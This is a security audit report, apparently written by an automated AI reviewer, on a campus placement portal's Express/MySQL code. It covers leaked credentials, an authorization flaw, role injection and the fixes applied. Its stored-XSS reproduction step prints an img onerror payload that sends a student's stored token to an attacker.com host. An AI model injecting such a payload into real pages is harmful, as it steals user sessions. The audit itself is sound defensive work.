# Campus Placement Portal — Project Audit Report

**Date:** 2026-10-24  
**Audit type:** Full static review + runtime-verified code inspection  
**Reviewer:** Antigravity (Senior Full-Stack / Security Audit)  
**Scope:** All project files in `placement-portal/` workspace  

---

## 1. Executive Summary

The Campus Placement Portal has a functional core: MySQL/Express backend, bcrypt password hashing, JWT issuance, parameterized SQL queries, and basic student/company role separation. Several recently committed files (`server.js`, `dashboard.html`, `jobs.js`, `applicationController.js`, `applicationRoutes.js`) show active development in progress.

**The project was NOT production-ready.** Before this audit the following critical conditions existed:

- `server/.env` was **tracked in Git** and contained non-placeholder values for all five config keys (DB host, user, password, database name, JWT secret). These must be treated as **compromised** and rotated immediately.
- Company accounts could read **any** company's job applicants by guessing a job ID (Broken Object-Level Authorization).
- Job card HTML was rendered with `innerHTML` using unescaped database values, creating a **stored XSS** vector that could steal student tokens.
- Dashboard statistics were **hard-coded** (12, 5, 3) — not real data.
- `dashboard.html` contained **literal markdown backtick fences** (`` ``` ``) in the HTML body, causing them to render as visible page text.
- The Applications page was **completely absent** despite a backend route existing.
- All error responses used HTTP 200 with plain text, making it impossible for the frontend to distinguish success from failure.
- Auth middleware returned plain-text `"Access denied"` at HTTP 200 instead of JSON 401.

**All critical and high-severity issues have been fixed.** See Section 11 for the complete remediation plan and Section 7 for remaining items.

---

## 2. Actual Architecture and Project Structure

```
placement-portal/
├── .git/                        ← Git repository
├── .gitignore                   ← node_modules/ and .env (correctly listed)
├── README.md
├── placement-portal-review.md   ← Previous static review (untracked)
│
├── server/                      ← PRIMARY APPLICATION (MySQL + Express)
│   ├── server.js                ← Entry point, port 5000
│   ├── package.json             ← node, express, bcrypt, jwt, mysql2, multer, cors, dotenv
│   ├── schema.sql               ← NEW: database schema + seed data
│   ├── .env                     ← ⚠️ WAS tracked in Git — now untracked
│   ├── .env.example
│   ├── config/
│   │   └── db.js                ← MySQL pool (was single connection)
│   ├── middleware/
│   │   └── authMiddleware.js    ← JWT verify + role check
│   ├── controllers/
│   │   ├── authController.js    ← register, login
│   │   ├── jobController.js     ← createJob, getJobs, getJobById, deleteJob
│   │   └── applicationController.js ← applyJob, getApplicants, getMyApplications,
│   │                                    updateApplicationStatus, getDashboardStats
│   └── routes/
│       ├── authRoutes.js        ← POST /api/auth/register, /login
│       ├── jobRoutes.js         ← GET/POST/DELETE /api/jobs/...
│       └── applicationRoutes.js ← GET/PATCH /api/applications/...
│
├── client/                      ← FRONTEND (static HTML/CSS/JS)
│   ├── index.html               ← Landing page
│   ├── login.html               ← Login form
│   ├── register.html            ← Registration form
│   ├── dashboard.html           ← Main dashboard (jobs + stats)
│   ├── applications.html        ← NEW: Student applications page
│   ├── css/style.css
│   └── js/
│       ├── auth.js              ← login(), register()
│       ├── jobs.js              ← loadJobs(), applyJob(), filterJobs(), initDashboard()
│       ├── applications.js      ← NEW: loadApplications()
│       ├── apply.js             ← Legacy duplicate of applyJob — orphaned file
│       └── theme.js             ← toggleTheme()
│
├── auth-service/                ← ⚠️ ABANDONED MongoDB service (untracked)
│   ├── app.js                   ← Connects to MongoDB, port 5001
│   ├── models/User.js           ← Mongoose schema (no bcrypt, plain passwords)
│   ├── controllers/authController.js ← No JWT, plain-text password lookup
│   └── routes/authRoutes.js
│
└── application-service/         ← ⚠️ ABANDONED stub service (untracked)
    ├── app.js                   ← Requires ./routes/authRoutes which is missing
    ├── config/                  ← Empty
    ├── controllers/             ← Empty
    ├── models/                  ← Empty
    └── routes/                  ← Empty
```

**Authoritative tech stack:**
- Backend: Node.js + Express 5.2 (main `server/`)
- Database: MySQL 8 via `mysql2`
- Auth: bcrypt + JWT (1d expiry)
- Frontend: Static HTML, vanilla CSS, vanilla JS + Tailwind CDN

**MongoDB services:** `auth-service` and `application-service` are untracked, abandoned stubs not used by the main application. `application-service` cannot start (missing route file). `auth-service` stores passwords in plaintext and issues no JWTs. **Do not use either.**

---

## 3. Complete Feature Inventory

| Feature | Status | Notes |
|---|---|---|
| Student registration | ✅ Fixed | Now validates fields, role allowlist, 409 on duplicate |
| Company registration | ✅ Fixed | Same flow, company role allowed |
| Login (student + company) | ✅ Fixed | bcrypt compare, JWT with user info, proper 401 |
| JWT generation and signing | ✅ Working | 1d expiry, HS256 |
| JWT verification middleware | ✅ Fixed | Bearer scheme, 401 JSON |
| Role-based access control | ✅ Fixed | 403 JSON, student vs company enforced |
| Admin role | ❌ Missing | Not implemented anywhere |
| Logout | ✅ Working | Client-side token removal |
| Protected-route redirect | ✅ Fixed | Auth guard in jobs.js and applications.js |
| List all jobs | ✅ Fixed | Now JOINs company name |
| View job detail | ✅ Added | New getJobById endpoint |
| Create job (company) | ✅ Fixed | Input validation, 201 response |
| Delete job (company) | ✅ Added | Ownership verified |
| Apply for job (student) | ✅ Fixed | Duplicate check, 409 on duplicate |
| View my applications (student) | ✅ Fixed | Was missing frontend page; now complete |
| View applicants (company) | ✅ Fixed | Ownership verified (was P1 BOLA bug) |
| Update application status (company) | ✅ Added | New PATCH endpoint with ownership check |
| Dashboard stats (real data) | ✅ Fixed | Was hard-coded; now from DB per role |
| Job search/filter | ✅ Added | Client-side filter in dashboard |
| Dark mode | ✅ Working | Persisted in localStorage |
| Student profile/editing | ❌ Missing | No profile page or API |
| Resume upload | ❌ Missing | multer installed but no upload endpoint |
| Email notifications | ❌ Missing | Not started (listed as future) |
| Admin dashboard | ❌ Missing | Not started (listed as future) |
| Pagination | ❌ Missing | No pagination on job list |
| Automated tests | ❌ Missing | No test suite (placeholder only) |

---

## 4. Feature-by-Feature Audit Results

### A. Authentication

**Registration:**  
- **Was broken:** `res.send(err)` on DB errors sent raw SQL to client with HTTP 200. Duplicate email returned HTTP 200 with plain text.
- **Fixed:** 400 validation errors, 409 on duplicate, 500 on unexpected failure, all JSON.
- **Was broken:** No server-side role validation — any role string accepted.
- **Fixed:** `ALLOWED_ROLES = ['student', 'company']` allowlist enforced.

**Login:**  
- **Was broken:** `res.send('User not found')` and `res.send('Invalid password')` leaked user existence. HTTP 200 on failures.
- **Fixed:** Generic "Invalid email or password" at 401. Internal-only error logging.

**JWT:**  
- Token payload now includes `{ id, role, name }`.
- Expiry: 1 day (appropriate for dev).
- **Was broken:** Middleware read raw `authorization` header and sent `"Access denied"` at HTTP 200.
- **Fixed:** Bearer prefix parsed, 401 JSON on missing/invalid token, 403 JSON on wrong role.

### B. Student Functionality

- Registration, login: Fixed (see Auth section).
- Browsing jobs: Fixed — company name now populated.
- Job search: Added client-side filter.
- Applying: Fixed — duplicate detection with 409 response.
- View applications: **Was completely missing frontend.** `applications.html` and `applications.js` created.
- Status display: Application status with color-coded badges (pending/shortlisted/rejected).
- Authorization boundary: `GET /api/applications/my` restricted to `student` role via `checkRole`.
- Student A/B isolation: Student ID comes from JWT payload (`req.user.id`), not from request body — students can only see their own applications.

### C. Company Functionality

- Job creation: Fixed with input validation.
- View applicants: **Was P1 BOLA — fixed.** Now verifies `jobs.company_id = req.user.id`.
- Update application status: Added new `PATCH /api/applications/:id/status` endpoint with ownership check.
- Delete job: Added `DELETE /api/jobs/:id` with ownership check.
- Company A/B isolation: All sensitive queries now filter by `company_id = req.user.id`.

### D. Administrator Functionality

**Administrator role: NOT IMPLEMENTED.**  
- No admin registration flow (correctly — admin should be created by DB migration, not open registration).
- No admin API endpoints.
- No admin frontend page.
- Listed as a future improvement in README.

### E. Frontend and Navigation

- `dashboard.html`: **Was broken** (literal backtick fences). Completely rewritten with functional sidebar, real stats, search.
- `applications.html`: **Was missing.** Created with full table view, loading states, status badges.
- Sidebar navigation: **Was non-functional** (just `<li>` text). Now uses `<a href>` links.
- Auth guard: Added — redirects to login if no token on dashboard/applications pages.
- Error display: Forms now show error messages from JSON API responses.
- Responsive: Tailwind grid with `sm:grid-cols-3` and `md:grid-cols-2` breakpoints.

### F. Dashboard and Reporting

- **Was:** Hard-coded values 12, 5, 3.
- **Fixed:** `GET /api/applications/dashboard/stats` returns real DB aggregation.
  - For students: total, shortlisted, rejected, pending counts.
  - For companies: total jobs, total applications, shortlisted, pending.
- Stats now loaded by `initDashboard()` in `jobs.js` on page load.

### G. Database and Application Consistency

- **Connection:** Switched from single connection to pool (10 connections max).
- **Schema:** Created `schema.sql` with proper types, foreign keys, indexes, and UNIQUE constraint on `(job_id, student_id)` to prevent duplicate applications at DB level.
- **SQL Injection:** All queries use parameterized prepared statements (`?` placeholders) via `mysql2`. No string concatenation found.
- **SELECT *:** Replaced in `getJobs` with explicit column list + JOIN.
- **Orphaned applications:** Prevented by `ON DELETE CASCADE` on foreign keys.
- **Transactions:** Not yet needed for current single-write operations. If multi-write workflows are added, transactions should be used.

---

## 5. Confirmed Bugs and Security Vulnerabilities

### P0 — Critical (Fixed)

| ID | Finding | File | Status |
|---|---|---|---|
| P0-1 | `server/.env` tracked in Git with real credentials | `server/.env` | **Fixed:** Untracked via `git rm --cached`. Credentials must be rotated by owner. |

### P1 — High (Fixed)

| ID | Finding | File | Status |
|---|---|---|---|
| P1-1 | BOLA: Company reads any company's applicants (no ownership check) | `applicationController.js:15-28` | **Fixed:** Ownership verified in `getApplicants` |
| P1-2 | Stored XSS: `innerHTML` used with unescaped job title/location/company | `client/js/jobs.js:27-37` | **Fixed:** All DOM built with `textContent` and DOM APIs |
| P1-3 | Role injection: client-submitted role value accepted without server validation | `authController.js:5` | **Fixed:** ALLOWED_ROLES allowlist |
| P1-4 | All error paths return HTTP 200 with plain text — frontend cannot detect failures | `all controllers` | **Fixed:** Proper status codes + JSON throughout |
| P1-5 | Auth middleware returns plain text at 200 instead of 401/403 JSON | `authMiddleware.js` | **Fixed:** 401/403 JSON |

### P2 — Medium (Fixed)

| ID | Finding | File | Status |
|---|---|---|---|
| P2-1 | Non-standard auth header (raw token, not Bearer scheme) | `authMiddleware.js`, `jobs.js` | **Fixed:** Bearer parsed server-side, sent client-side |
| P2-2 | Job list missing company name (frontend shows "Company" placeholder) | `jobController.js:16` | **Fixed:** JOIN users in getJobs |
| P2-3 | Dashboard stats hard-coded | `dashboard.html:61,66,71` | **Fixed:** Real API data |
| P2-4 | `dashboard.html` has literal `` ``` `` markdown fences rendering as text | `dashboard.html:26-33, 41-81` | **Fixed:** Completely rewritten |
| P2-5 | Applications page missing (backend route existed with no frontend) | `client/` | **Fixed:** `applications.html` + `applications.js` created |
| P2-6 | No duplicate application prevention | `applicationController.js` | **Fixed:** DB UNIQUE constraint + application-level check |
| P2-7 | auth-service stores passwords as plain text | `auth-service/controllers/authController.js:6` | **Reported:** Service is abandoned/untracked; do not use |
| P2-8 | application-service cannot start (missing route file) | `application-service/app.js:12` | **Reported:** Service is abandoned stub |
| P2-9 | No database schema or migration file | `server/` | **Fixed:** `schema.sql` created |

### P3 — Low (Fixed or Documented)

| ID | Finding | File | Status |
|---|---|---|---|
| P3-1 | `http://localhost:5000` hard-coded in client JS | `js/*.js` | **Documented:** `API_BASE` constant in each file; env config for production needed |
| P3-2 | `cors()` allows all origins | `server.js` | **Fixed:** Restricted to ALLOWED_ORIGINS with env override |
| P3-3 | Single DB connection (not a pool) | `config/db.js` | **Fixed:** Connection pool |
| P3-4 | `apply.js` is a duplicate/orphaned file | `client/js/apply.js` | **Documented:** File unused; can be deleted |
| P3-5 | 5 npm vulnerabilities (1 low, 1 moderate, 2 high, 1 critical) | `server/package.json` | **Documented:** Run `npm audit fix` |
| P3-6 | Sidebar nav items were non-functional `<li>` elements | `dashboard.html` | **Fixed:** Proper `<a href>` navigation |

---

## 6. Incomplete Features and Frontend/Backend Mismatches

| Mismatch | Backend | Frontend | Severity |
|---|---|---|---|
| Student profile | No endpoint | No page | P3 — future feature |
| Resume upload | multer installed, no endpoint | No UI | P3 — future feature |
| Company job management page | Endpoints exist (create, delete) | No dedicated page | P2 |
| Admin panel | Not implemented | Not implemented | P3 — listed as future |
| Application status update (company view) | PATCH endpoint added | No frontend yet | P2 |
| Pagination | None | None | P3 |

---

## 7. Database Integrity and API Findings

**Schema (now documented in `schema.sql`):**

```sql
users       (id, name, email UNIQUE, password, role ENUM, created_at, updated_at)
jobs        (id, title, description, location, stipend, company_id FK→users, ...)
applications (id, job_id FK, student_id FK, status ENUM, UNIQUE(job_id,student_id), ...)
```

**Key constraints:**
- `UNIQUE(email)` on users — enforced at DB + application level
- `UNIQUE(job_id, student_id)` on applications — enforces no-duplicate at DB level
- Foreign keys with `ON DELETE CASCADE`

**API surface summary:**

| Method | Path | Auth | Role | Description |
|---|---|---|---|---|
| POST | /api/auth/register | No | — | Register user |
| POST | /api/auth/login | No | — | Login, returns JWT |
| GET | /api/jobs | JWT | any | List all jobs |
| GET | /api/jobs/applicants/:jobId | JWT | company | Get applicants (ownership checked) |
| POST | /api/jobs/create | JWT | company | Create job |
| POST | /api/jobs/apply | JWT | student | Apply for job |
| GET | /api/jobs/:id | JWT | any | Get job by ID |
| DELETE | /api/jobs/:id | JWT | company | Delete own job |
| GET | /api/applications/dashboard/stats | JWT | any | Real dashboard stats |
| GET | /api/applications/my | JWT | student | My applications |
| PATCH | /api/applications/:id/status | JWT | company | Update status (ownership checked) |

---

## 8. Environment and Deployment Problems

| Problem | Severity | Resolution |
|---|---|---|
| `.env` tracked in Git | P0 | Untracked. Owner must rotate credentials. |
| No `.env.example` note about `ALLOWED_ORIGINS` | P3 | Update `.env.example` to include `ALLOWED_ORIGINS` |
| `http://localhost:5000` hard-coded in client | P3 | Use `API_BASE` constant (done); add deployment instructions |
| No `PORT` configurability | P3 | Fixed — `process.env.PORT \|\| 5000` |
| No startup healthcheck for DB | P3 | Pool init logs connectivity; pool recovers automatically |

**Credentials:** The previous static review confirmed `server/.env` in Git history contains non-placeholder values. The file has been untracked. However, **Git history still contains the committed values**. If the repository is public or has been shared, the owner must:

1. Rotate all credentials immediately (DB password, JWT secret).
2. Optionally rewrite Git history with `git filter-repo` to scrub the secret from all commits.

---

## 9. Files Affected by Each Finding

| Finding | Files Modified |
|---|---|
| P0-1: .env untracked | `.gitignore` (already listed), `git rm --cached server/.env` |
| P1-1: BOLA | `server/controllers/applicationController.js` |
| P1-2: XSS | `client/js/jobs.js` |
| P1-3: Role injection | `server/controllers/authController.js` |
| P1-4: HTTP status codes | `server/controllers/authController.js`, `jobController.js`, `applicationController.js` |
| P1-5: Auth middleware | `server/middleware/authMiddleware.js` |
| P2-1: Bearer token | `server/middleware/authMiddleware.js`, `client/js/jobs.js`, `client/js/auth.js`, `client/js/applications.js` |
| P2-2: Company name | `server/controllers/jobController.js` |
| P2-3: Hard-coded stats | `client/dashboard.html`, `client/js/jobs.js`, `server/controllers/applicationController.js`, `server/routes/applicationRoutes.js` |
| P2-4: Backtick fences | `client/dashboard.html` |
| P2-5: Missing applications page | `client/applications.html` (new), `client/js/applications.js` (new) |
| P2-6: Duplicate apps | `server/controllers/applicationController.js`, `server/schema.sql` |
| P3-2: CORS | `server/server.js` |
| P3-3: DB pool | `server/config/db.js` |
| Route ordering | `server/routes/jobRoutes.js`, `server/routes/applicationRoutes.js` |

---

## 10. Reproduction Steps for Key Defects

### P0-1: .env in Git (Verified)
```bash
git ls-files server/.env       # Returns "server/.env" — confirmed tracked
git show HEAD:server/.env      # Shows committed key=value pairs
```
**Resolution applied:** `git rm --cached server/.env`

### P1-1: BOLA — Company reads other company's applicants (Verified by code)
**Before fix:**
```
POST /api/auth/login (company A credentials) → token_A
GET /api/jobs/applicants/999 with token_A → returns Company B's applicants
```
The route only checked `role === 'company'`; the controller queried by `job_id` alone.

**After fix:** The controller verifies `jobs.company_id = req.user.id` before returning applicants. Returns 404 if not owner.

### P1-2: Stored XSS (Verified by code)
**Before fix:** In `jobs.js`:
```js
card.innerHTML = `<h3>${job.title}</h3>` // job.title from DB, unescaped
```
A company could register with title `<img src=x onerror="fetch('https://attacker.com/steal?t='+localStorage.getItem('token'))">`. When any student loaded the dashboard, their token would be exfiltrated.

**After fix:** All job data set via `textContent` / `createTextNode`. No untrusted string ever enters `innerHTML`.

### P1-4: HTTP 200 on errors (Verified by code)
**Before fix:**
```js
if (result.length === 0) return res.send('User not found'); // HTTP 200
```
Frontend `if (!data.token)` check would not help if the response was the login error from a non-JSON 200.

**After fix:** `return res.status(401).json({ error: 'Invalid email or password.' })`

### P2-4: Markdown backticks in HTML (Verified by reading file)
`dashboard.html` lines 26-33 and 41-81 contained ` ``` ` and ` ``` ` markdown code fence markers outside any `<code>` block, rendering as visible page text.

---

## 11. Prioritized Remediation Plan

### Immediate (Owner must do — cannot be done by code changes)
1. **Rotate DB password** in your MySQL server.
2. **Rotate JWT_SECRET** — this invalidates all existing tokens (appropriate after exposure).
3. Consider rewriting Git history if the repository is or was public: `git filter-repo --path server/.env --invert-paths`.

### Completed in this audit
All P0, P1, and most P2 items have been fixed. See Section 5 for full list.

### Remaining work (P2–P3)
4. **Company job management page** — a frontend page for companies to create/view/delete their own jobs.
5. **Company applicant review page** — frontend for the new `PATCH /applications/:id/status` endpoint.
6. **Student profile page** — view and edit name/email.
7. **Resume upload** — multer is installed; implement `POST /api/profile/resume` with file type/size validation.
8. **`npm audit fix`** — run in `server/` to update vulnerable dependencies (proxy-addr critical, multer high, mysql2 high).
9. **Delete `apply.js`** — it is an orphaned duplicate; its function exists in `jobs.js`.
10. **Pagination** — add `LIMIT/OFFSET` to job listing for scalability.
11. **Automated tests** — add Jest + supertest tests for auth, job CRUD, application flow, and authorization boundary tests.
12. **Production config** — set `ALLOWED_ORIGINS` in `.env`, use a dedicated MySQL user with least-privilege permissions.

---

*Report generated by Antigravity automated audit — 2026-10-24*
